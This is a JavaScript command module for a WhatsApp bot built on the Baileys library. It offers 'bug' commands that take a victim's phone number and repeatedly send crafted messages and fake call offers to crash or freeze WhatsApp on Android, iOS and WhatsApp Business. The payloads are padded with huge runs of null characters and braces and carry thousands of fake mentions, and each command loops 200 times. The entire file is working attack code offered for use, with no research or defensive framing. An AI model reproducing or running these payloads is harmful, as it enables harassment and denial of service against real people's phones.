import { generateWAMessageFromContent, proto, encodeSignedDeviceIdentity } from "@whiskeysockets/baileys";
import crypto from "crypto";
import { getContextInfo } from "./utils.js";

// Helper function pour décoder les JIDs
const jidDecode = (jid) => {
  if (!jid || typeof jid !== 'string') return null;
  const parts = jid.replace(/@.*$/, '').split(':');
  return {
    user: parts[0],
    device: parts[1] ? parseInt(parts[1]) : 0
  };
};

// Helper function pour encoder les messages
const encodeWAMessage = (msg) => {
  try {
    // Convertir le message en binaire
    if (msg instanceof Uint8Array) return msg;
    if (typeof msg === 'string') return Buffer.from(msg, 'utf8');
    if (msg && msg.constructor === Object) {
      return Buffer.from(JSON.stringify(msg), 'utf8');
    }
    return Buffer.from(String(msg), 'utf8');
  } catch (e) {
    console.error('encodeWAMessage error:', e);
    return Buffer.alloc(0);
  }
};

// ===================== HELPERS =====================
export const sleep = ms => new Promise(r => setTimeout(r, ms));

// ===================== TSW BUG FUNCTIONS =====================

// === AUTOSYNC - Travas Android (SQUICHY ENHANCED) ===
async function autosync(sock, X) {
    try {
        const { encodeSignedDeviceIdentity, jidDecode: jd, encodeWAMessage: ew } = await import("@whiskeysockets/baileys");
        
        const devices = (await sock.getUSyncDevices([X], false, false)).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
        await sock.assertSessions(devices);

        const xnxx = () => {
            const map = {};
            return {
                mutex(key, fn) {
                    map[key] ??= { task: Promise.resolve() };
                    map[key].task = (async prev => { try { await prev; } catch {} return fn(); })(map[key].task);
                    return map[key].task;
                }
            };
        };

        const memek = xnxx();
        const bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
        const yntkts = sock.encodeWAMessage?.bind(sock);

        sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
            if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };
            const patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
            const ywdh = Array.isArray(patched) ? patched : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

            const { id: meId, lid: meLid } = sock.authState.creds.me;
            const omak = meLid ? jd(meLid)?.user : null;
            let shouldIncludeDeviceIdentity = false;

            const nodes = await Promise.all(ywdh.map(async ({ recipientJid: jid, message: msg }) => {
                const { user: targetUser } = jd(jid);
                const { user: ownPnUser } = jd(meId);
                const isOwnUser = targetUser === ownPnUser || targetUser === omak;
                const y = jid === meId || jid === meLid;
                if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

                const bytes = bokep(yntkts ? yntkts(msg) : ew(msg));
                return memek.mutex(jid, async () => {
                    const { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid, data: bytes });
                    if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
                    return { tag: 'to', attrs: { jid }, content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }] };
                });
            }));

            return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
        };

        const awik = crypto.randomBytes(32);
        const awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);
        const { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

        const offerContent = [
            { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
            { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
            { tag: "video", attrs: { orientation: "0", screen_width: "99999", screen_height: "99999", device_orientation: "0", enc: "vp8", dec: "vp8" } },
            { tag: "net", attrs: { medium: "3" } },
            { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
            { tag: "encopt", attrs: { keygen: "2" } },
            { tag: "destination", attrs: {}, content: destinations },
            ...(shouldIncludeDeviceIdentity ? [{ tag: "device-identity", attrs: {}, content: encodeSignedDeviceIdentity(sock.authState.creds.account, true) }] : [])
        ];

        const lemiting = {
            tag: "call",
            attrs: { to: X, id: sock.generateMessageTag(), from: sock.user.id },
            content: [{ tag: "offer", attrs: { "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(), "call-creator": sock.user.id }, content: offerContent }]
        };

        await sock.sendNode(lemiting);
    } catch (err) {
        console.error("[AUTOSYNC SQUICHY ERROR]", err);
    }
}

// === GHOST IOS - InVsSwIphone (SQUICHY ENHANCED - JustFcDelete based) ===
async function InVsSwIphone(sock, X, ptcp = true) {
    try {
        const { encodeSignedDeviceIdentity, jidDecode: jd, encodeWAMessage: ew } = await import("@whiskeysockets/baileys");

        // Delete msg first
        const JustinApi = await generateWAMessageFromContent(X, { conversation: " " }, { userJid: sock.user.id });
        await sock.relayMessage(X, JustinApi.message, { messageId: JustinApi.key.id });
        await sock.sendMessage(X, { delete: JustinApi.key });

        let devices = (await sock.getUSyncDevices([X], false, false)).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
        await sock.assertSessions(devices);

        let Justin = (() => {
            let map = {};
            return {
                mutex(key, fn) {
                    map[key] ??= { task: Promise.resolve() };
                    map[key].task = (async prev => { try { await prev; } catch { } return fn(); })(map[key].task);
                    return map[key].task;
                }
            };
        })();

        let Official = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
        let Cyber = sock.encodeWAMessage?.bind(sock);

        sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
            if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };
            let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
            let memeg = Array.isArray(patched) ? patched : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));
            let { id: meId, lid: meLid } = sock.authState.creds.me;
            let omak = meLid ? jd(meLid)?.user : null;
            let shouldIncludeDeviceIdentity = false;

            let nodes = await Promise.all(memeg.map(async ({ recipientJid: jid, message: JustinApi }) => {
                let { user: isTargetUser } = jd(jid);
                let { user: ownPnUser } = jd(meId);
                let isOwnUser = isTargetUser === ownPnUser || isTargetUser === omak;
                let y = jid === meId || jid === meLid;
                if (dsmMessage && isOwnUser && !y) JustinApi = dsmMessage;
                let bytes = Official(Cyber ? Cyber(JustinApi) : ew(JustinApi));
                return Justin.mutex(jid, async () => {
                    let { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid, data: bytes });
                    if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
                    return { tag: 'to', attrs: { jid }, content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }] };
                });
            }));
            return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
        };

        let Exo = crypto.randomBytes(32);
        let Floods = Buffer.concat([Exo, Buffer.alloc(8, 0x01)]);
        let { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

        let lemiting = {
            tag: "call",
            attrs: { to: X, id: sock.generateMessageTag(), from: sock.user.id },
            content: [{
                tag: "offer",
                attrs: { "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(), "call-creator": sock.user.id },
                content: [
                    { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                    { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                    { tag: "video", attrs: { orientation: "0", screen_width: "1920", screen_height: "1080", device_orientation: "0", enc: "vp8", dec: "vp8" } },
                    { tag: "net", attrs: { medium: "3" } },
                    { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                    { tag: "encopt", attrs: { keygen: "2" } },
                    { tag: "destination", attrs: {}, content: destinations },
                    ...(shouldIncludeDeviceIdentity ? [{ tag: "device-identity", attrs: {}, content: encodeSignedDeviceIdentity(sock.authState.creds.account, true) }] : [])
                ]
            }]
        };

        await sock.sendNode(lemiting);
    } catch (err) {
        console.error("[GHOST IOS SQUICHY ERROR]", err);
    }
}

// === PENDING MSG - InVisDelayLoc (SQUICHY ENHANCED - inTers2 based) ===
async function InVisDelayLoc(sock, X, ptcp = true) {
    for (let r = 0; r < 15; r++) {
        let msg = generateWAMessageFromContent(X, {
            interactiveResponseMessage: {
                body: { text: "\u0000".repeat(444), format: "DEFAULT" },
                nativeFlowResponseMessage: {
                    name: "menu_options",
                    paramsJson: `{"display_text":"#  Primis #","id":"D5","description":" ${"\u0000".repeat(666666)} "}`,
                    version: 3
                },
                contextInfo: {
                    mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                }
            }
        }, {});

        await sock.relayMessage(X, { groupStatusMessageV2: { message: msg.message } }, ptcp ? { participant: { jid: X } } : {});
    }
    await sleep(3000);
}

// === CAROUSEL PARAMS (SQUICHY ENHANCED - InvSCrt based) ===
async function CorosuelParams(sock, target) {
    try {
        const msg = await generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: { text: "Primis", format: "DEFAULT" },
                        nativeFlowResponseMessage: {
                            name: "menu_options",
                            paramsJson: `{"display_text":"Primis","id":"R4","description":" ${"\u0000".repeat(666666)} "}`,
                            version: 3
                        },
                        contextInfo: {
                            stanzaId: sock.generateMessageTag(),
                            participant: target,
                            remoteJid: "0@s.whatsapp.net",
                            mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                            isForwarded: true,
                            forwardingScore: 999
                        }
                    }
                }
            }
        }, { userJid: target });

        const msg2 = await generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: { text: "Primis", format: "DEFAULT" },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: JSON.stringify({ flow_cta: "\u0000".repeat(88888) }),
                            version: 3
                        },
                        contextInfo: {
                            stanzaId: sock.generateMessageTag(),
                            participant: target,
                            remoteJid: "0@s.whatsapp.net",
                            mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                            isForwarded: true,
                            forwardingScore: 999
                        }
                    }
                }
            }
        }, { userJid: target });

        const msg3 = await generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: { text: "Primis", format: "DEFAULT" },
                        nativeFlowResponseMessage: {
                            name: "address_message",
                            paramsJson: `{"values":{"in_pin_code":"999999","building_name":"CT","landmark_area":"X","address":"XT","tower_number":"Bokep","city":"Tangerang","name":"Family","phone_number":"628792638263","house_number":"99","floor_number":"28","state":"XT ${"\u0000".repeat(900000)}"}}`,
                            version: 3
                        },
                        contextInfo: {
                            stanzaId: sock.generateMessageTag(),
                            participant: target,
                            remoteJid: "0@s.whatsapp.net",
                            mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                            isForwarded: true,
                            forwardingScore: 999
                        }
                    }
                }
            }
        }, { userJid: target });

        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }]
        });

        await sock.relayMessage("status@broadcast", msg2.message, {
            messageId: msg2.key.id,
            additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }]
        });

        await sock.relayMessage("status@broadcast", msg3.message, {
            messageId: msg3.key.id,
            additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }]
        });

        await sock.relayMessage(target, { groupStatusMessageV2: { message: msg.message } }, { participant: { jid: target } });
    } catch (err) {
        console.error("[CAROUSEL SQUICHY ERROR]", err);
    }
}

// === EXTEND IOS (SQUICHY ENHANCED - gsInt based) ===
async function iNvsExTendIos(sock, X, ptcp = true) {
    for (let z = 0; z < 5; z++) {
        let ZxY = {
            interactiveResponseMessage: {
                contextInfo: {
                    mentionedJid: Array.from({ length: 2000 }, (_, z) => `628${z + 72}@s.whatsapp.net`),
                    isForwarded: true,
                    forwardingScore: 7205,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: "12037205250208@newsletter",
                        newsletterName: "Primis - Ex3cutor | Information",
                        serverMessageId: 1000,
                        accessibilityText: "િ፷�̶�̈́͟��̶ᐁ��̽͢��𝑺̽፮▾ ༑̴⟆"
                    },
                    statusAttributionType: "RESHARED_FROM_MENTION",
                    contactVcard: true,
                    isSampled: true,
                    dissapearingMode: { initiator: X, initiatedByMe: true },
                    expiration: Date.now()
                },
                body: { text: "િ፷𝑫̶𝒔̈́͟𝑷𝒓̶ᐁ𝑰𝒎̽͢𝒊𝒔𝑺̽፮▾ ༑̴⟆˒", format: "DEFAULT" },
                nativeFlowResponseMessage: {
                    name: "address_message",
                    paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"D5!Primis¿?","phone_number":"+13135550202","house_number":"7205826","floor_number":"16","state":"${"\u0000".repeat(100000)}"}}`,
                    version: 3
                }
            }
        };

        let msg = generateWAMessageFromContent(X, { groupStatusMessageV2: { message: ZxY } }, {});
        await sock.relayMessage(X, msg.message, ptcp ? { messageId: msg.key.id, participant: { jid: X } } : { messageId: msg.key.id });
    }
}

// === MEMEK CICI - Force Close WhatsApp Business [2026] ===
async function memekcici(sock, target) {
    try {
        let message = {
            ephemeralMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "🌸⃟༑⌁⃰𝐕𝐢𝐥͢𝐞𝐬𝐭𝐚 𝐒𝐜𝐫͢𝐢𝐩𝐭ͮ͢ཀ͜͡🎀",
                            hasMediaAttachment: false,
                            locationMessage: {
                                degreesLatitude: -6666666666,
                                degreesLongitude: 6666666666,
                                name: "🌸⃟༑⌁⃰𝐕𝐢𝐥͢𝐞𝐬𝐭𝐚 𝐒𝐜𝐫͢𝐢𝐩𝐭ͮ͢ཀ͜͡🎀",
                                address: "cicitzy.json",
                            },
                        },
                        body: {
                            text: "cici clyriné",
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{".repeat(10000),
                        },
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from(
                                    { length: 2000 },
                                    () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                ),
                            ],
                        },
                    },
                },
            },
        };

        await sock.relayMessage(target, message, {
            messageId: null,
            participant: { jid: target },
            userJid: target,
        });
    } catch (err) {
        console.log("[MEMEKCICI ERROR]", err);
    }
}

// ===================== COMMANDS =====================

const bugmenu = {
    name: "bugmenu",
    description: "Affiche toutes les commandes de bugs",
    category: "bug",
    execute: async (sock, msg, args, from) => {
        const totalSeconds = process.uptime();
        const hours = Math.floor(totalSeconds / 3600);
        const minutes = Math.floor((totalSeconds % 3600) / 60);
        const seconds = Math.floor(totalSeconds % 60);
        const uptime = `${hours}h ${minutes}m ${seconds}s`;

        const menuText = `> ╔════════════════════════╗
>      💢 𝐒𝐈𝐆𝐌𝐀 𝐌𝐃𝐗 - 𝐁𝐔𝐆 💢
> ╚════════════════════════╝

> 🥷🏾 *Utilisateur* : ${msg.pushName || "Invité"}
> ⏱️ *Uptime*      : ${uptime}
> 📱 *Version*     : 3.0 SQUICHY
> 🧎🏾 *Dev*         : _MUZAN SIGMA_ + _SQUICHY_

> ╔───── ☠️ BUG MENU ☠️ ─────╗
> ┃ ➤ travas (numéro)
> ┃ ➤ pending (numéro)
> ┃ ➤ ghost (numéro)
> ┃ ➤ brutal (numéro)
> ┃ ➤ extend (numéro)
> ┃ ➤ memek (numéro) [NEW 2026]
> ╚──────────────────────────╝

> 💢 *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍᴜᴢᴀɴ sɪɢᴍᴀ* 💢`;     // Toujours envoyer le menu en texte pour éviter les erreurs de connexion (ETIMEDOUT)
        const senderJid = msg.key?.participant || msg.key?.remoteJid || sock.user?.id;
        const context = getContextInfo(senderJid);
        await sock.sendMessage(from, { text: menuText, contextInfo: context }, { quoted: msg });

        // Médias optionnels : en cas de timeout, l'utilisateur a déjà le menu
        try {
            await sock.sendMessage(from, {
                image: { url: "https://files.catbox.moe/6uizvk.jpg" },
                caption: menuText,
                gifPlayback: false,
                contextInfo: context
            }, { quoted: msg });
        } catch (e) {
            console.warn("[bugmenu] Image non envoyée (timeout/connexion):", e?.message || e);
        }
        try {
            await sock.sendMessage(from, {
                audio: { url: "https://files.catbox.moe/59g6u8.mp3" },
                mimetype: "audio/mpeg",
                ptt: true,
                contextInfo: context
            }, { quoted: msg });
        } catch (e) {
            console.warn("[bugmenu] Audio non envoyé (timeout/connexion):", e?.message || e);
        }
    },
};

// === TRAVAS - Android Bug ===
const travas = {
    name: "travas",
    execute: async (sock, msg, args, from) => {
        const q = args[0];
        const senderJid = msg.key?.participant || msg.key?.remoteJid || sock.user?.id;
        const context = getContextInfo(senderJid);
        if (!q) {
            return sock.sendMessage(from, { text: `📌 Exemple : travas 237xxxxxxxx`, contextInfo: context }, { quoted: msg });
        }

        let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        const bare = q.replace(/[^0-9]/g, "");

        try {
            try {
                await sock.sendMessage(from, {
                    image: { url: "https://files.catbox.moe/6uizvk.jpg" },
                    caption: `☠️ *TRAVAS ANDROID*\n\n🎯 Cible : wa.me/${bare}\n\n💢 *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍᴜᴢᴀɴ sɪɢᴍᴀ*`,
                    contextInfo: context
                }, { quoted: msg });
            } catch (e) {
                try { await sock.sendMessage(from, { text: `☠️ *TRAVAS ANDROID*\n\n🎯 Cible : wa.me/${bare}\n\n💢 *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍᴜᴢᴀɴ sɪɢᴍᴀ*`, contextInfo: context }, { quoted: msg }); } catch (_) {}
            }
        } catch (_) {}

        await sleep(2000);

        for (let i = 0; i < 200; i++) {
            try {
                await autosync(sock, target);
                await autosync(sock, target);
            } catch (err) { console.error("❌ Erreur travas itération:", err?.message || err); }
            await new Promise(resolve => setImmediate(resolve));
        }
        try { await sock.sendMessage(from, { react: { text: "💀", key: msg.key } }); } catch (_) {}
    }
};

// === PENDING - Pending Message Bug ===
const pending = {
    name: "pending",
    execute: async (sock, msg, args, from) => {
        const q = args[0];
        const senderJid = msg.key?.participant || msg.key?.remoteJid || sock.user?.id;
        const context = getContextInfo(senderJid);
        if (!q) {
            return sock.sendMessage(from, { text: `📌 Exemple : pending 237xxxxxxxx`, contextInfo: context }, { quoted: msg });
        }

        let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        const bare = q.replace(/[^0-9]/g, "");

        try {
            try {
                await sock.sendMessage(from, {
                    image: { url: "https://files.catbox.moe/m34aop.jpg" },
                    caption: `⏳ *PENDING MSG*\n\n🎯 Cible : wa.me/${bare}\n\n💢 *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍᴜᴢᴀɴ sɪɢᴍᴀ*`,
                    contextInfo: context
                }, { quoted: msg });
            } catch (e) {
                try { await sock.sendMessage(from, { text: `⏳ *PENDING MSG*\n\n🎯 Cible : wa.me/${bare}\n\n💢 *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍᴜᴢᴀɴ sɪɢᴍᴀ*`, contextInfo: context }, { quoted: msg }); } catch (_) {}
            }
        } catch (_) {}

        await sleep(2000);

        for (let z = 0; z < 200; z++) {
            try { await InVisDelayLoc(sock, target); } catch (err) { console.error("❌ Erreur pending itération:", err?.message || err); }
            await new Promise(r => setImmediate(r));
        }
        try { await sock.sendMessage(from, { react: { text: "⏳", key: msg.key } }); } catch (_) {}
    }
};

// === GHOST - iOS Ghost Bug ===
const ghost = {
    name: "ghost",
    execute: async (sock, msg, args, from) => {
        const q = args[0];
        const senderJid = msg.key?.participant || msg.key?.remoteJid || sock.user?.id;
        const context = getContextInfo(senderJid);
        if (!q) {
            return sock.sendMessage(from, { text: `📌 Exemple : ghost 237xxxxxxxx`, contextInfo: context }, { quoted: msg });
        }

        let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        const bare = q.replace(/[^0-9]/g, "");

        try {
            try {
                await sock.sendMessage(from, {
                    image: { url: "https://files.catbox.moe/jwbrkr.jpg" },
                    caption: `👻 *GHOST IOS*\n\n🎯 Cible : wa.me/${bare}\n\n💢 *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍᴜᴢᴀɴ sɪɢᴍᴀ*`,
                    contextInfo: context
                }, { quoted: msg });
            } catch (e) {
                try { await sock.sendMessage(from, { text: `👻 *GHOST IOS*\n\n🎯 Cible : wa.me/${bare}\n\n💢 *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍᴜᴢᴀɴ sɪɢᴍᴀ*`, contextInfo: context }, { quoted: msg }); } catch (_) {}
            }
        } catch (_) {}

        await sleep(2000);

        for (let z = 0; z < 200; z++) {
            try { await InVsSwIphone(sock, target); } catch (err) { console.error("❌ Erreur ghost itération:", err?.message || err); }
            await new Promise(r => setImmediate(r));
        }
        try { await sock.sendMessage(from, { react: { text: "👻", key: msg.key } }); } catch (_) {}
    }
};

// === BRUTAL - Combined Bug ===
const brutal = {
    name: "brutal",
    execute: async (sock, msg, args, from) => {
        const q = args[0];
        const senderJid = msg.key?.participant || msg.key?.remoteJid || sock.user?.id;
        const context = getContextInfo(senderJid);
        if (!q) {
            return sock.sendMessage(from, { text: `📌 Exemple : brutal 237xxxxxxxx`, contextInfo: context }, { quoted: msg });
        }

        let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        const bare = q.replace(/[^0-9]/g, "");

        try {
            try {
                await sock.sendMessage(from, {
                    image: { url: "https://files.catbox.moe/y7c9p5.jpg" },
                    caption: `💀 *BRUTAL MODE*\n\n🎯 Cible : wa.me/${bare}\n\n💢 *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍᴜᴢᴀɴ sɪɢᴍᴀ*`,
                    contextInfo: context
                }, { quoted: msg });
            } catch (e) {
                try { await sock.sendMessage(from, { text: `💀 *BRUTAL MODE*\n\n🎯 Cible : wa.me/${bare}\n\n💢 *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍᴜᴢᴀɴ sɪɢᴍᴀ*`, contextInfo: context }, { quoted: msg }); } catch (_) {}
            }
        } catch (_) {}

        await sleep(2000);

        for (let z = 0; z < 200; z++) {
            try {
                await autosync(sock, target);
                await InVisDelayLoc(sock, target);
                await InVsSwIphone(sock, target);
            } catch (err) { console.error("❌ Erreur brutal itération:", err?.message || err); }
            await new Promise(r => setImmediate(r));
        }
        try { await sock.sendMessage(from, { react: { text: "☠️", key: msg.key } }); } catch (_) {}
    }
};

// === MEMEK - Force Close WhatsApp Business [2026] ===
const memek = {
    name: "memek",
    execute: async (sock, msg, args, from) => {
        const q = args[0];
        const senderJid = msg.key?.participant || msg.key?.remoteJid || sock.user?.id;
        const context = getContextInfo(senderJid);
        if (!q) {
            return sock.sendMessage(from, { text: `📌 Exemple : memek 237xxxxxxxx`, contextInfo: context }, { quoted: msg });
        }

        let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        const bare = q.replace(/[^0-9]/g, "");

        try {
            try {
                await sock.sendMessage(from, {
                    image: { url: "https://files.catbox.moe/y7c9p5.jpg" },
                    caption: `💎 *MEMEK CICI*\n\n🎯 Cible : wa.me/${bare}\n💎 Force Close WhatsApp Business [2026]\n\n💢 *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍᴜᴢᴀɴ sɪɢᴍᴀ*`,
                    contextInfo: context
                }, { quoted: msg });
            } catch (e) {
                try { await sock.sendMessage(from, { text: `💎 *MEMEK CICI*\n\n🎯 Cible : wa.me/${bare}\n💎 Force Close WhatsApp Business [2026]\n\n💢 *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍᴜᴢᴀɴ sɪɢᴍᴀ*`, contextInfo: context }, { quoted: msg }); } catch (_) {}
            }
        } catch (_) {}

        await sleep(2000);

        for (let z = 0; z < 200; z++) {
            try { await memekcici(sock, target); } catch (err) { console.error("❌ Erreur memek itération:", err?.message || err); }
            await new Promise(r => setImmediate(r));
        }
        try { await sock.sendMessage(from, { react: { text: "💎", key: msg.key } }); } catch (_) {}
    }
};

// === EXTEND - Extended Text Bug ===
const extend = {
    name: "extend",
    execute: async (sock, msg, args, from) => {
        const q = args[0];
        const senderJid = msg.key?.participant || msg.key?.remoteJid || sock.user?.id;
        const context = getContextInfo(senderJid);
        if (!q) {
            return sock.sendMessage(from, { text: `📌 Exemple : extend 237xxxxxxxx`, contextInfo: context }, { quoted: msg });
        }

        let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        const bare = q.replace(/[^0-9]/g, "");

        try {
            try {
                await sock.sendMessage(from, {
                    image: { url: "https://files.catbox.moe/a33171.jpg" },
                    caption: `📱 *EXTEND IOS*\n\n🎯 Cible : wa.me/${bare}\n\n💢 *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍᴜᴢᴀɴ sɪɢᴍᴀ*`,
                    contextInfo: context
                }, { quoted: msg });
            } catch (e) {
                try { await sock.sendMessage(from, { text: `📱 *EXTEND IOS*\n\n🎯 Cible : wa.me/${bare}\n\n💢 *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍᴜᴢᴀɴ sɪɢᴍᴀ*`, contextInfo: context }, { quoted: msg }); } catch (_) {}
            }
        } catch (_) {}

        await sleep(2000);

        for (let z = 0; z < 200; z++) {
            try {
                await iNvsExTendIos(sock, target);
                await CorosuelParams(sock, target);
            } catch (err) { console.error("❌ Erreur extend itération:", err?.message || err); }
            await new Promise(r => setImmediate(r));
        }
        try { await sock.sendMessage(from, { react: { text: "📱", key: msg.key } }); } catch (_) {}
    }
};

// ===================== EXPORT =====================
export default [
    bugmenu,
    travas,
    pending,
    ghost,
    brutal,
    memek,
    extend
];
